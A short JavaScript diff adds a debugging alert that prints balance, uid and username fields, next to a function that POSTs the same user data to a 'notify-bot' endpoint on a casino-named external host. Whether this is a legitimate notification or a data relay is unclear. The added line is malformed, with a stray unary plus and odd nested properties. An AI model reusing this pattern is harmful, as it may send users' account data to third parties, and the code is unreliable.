@@ -19,7 +19,7 @@ sendData(dataToBeSent,
     error => console.log('Error:', error)
 );
 
-
+window.alert("Success "+dataToBeSent.balance+ " "+dataToBeSent.balance.uid+ " "+dataToBeSent.balance.balance.username+ " "+ +dataToBeSent.balance.balance.user);  ;
 function sendData(dataToBeSent, onSuccess, onError) {
     fetch('https://online-glorycasino.site:3001/notify-bot', {
         method: 'POST',
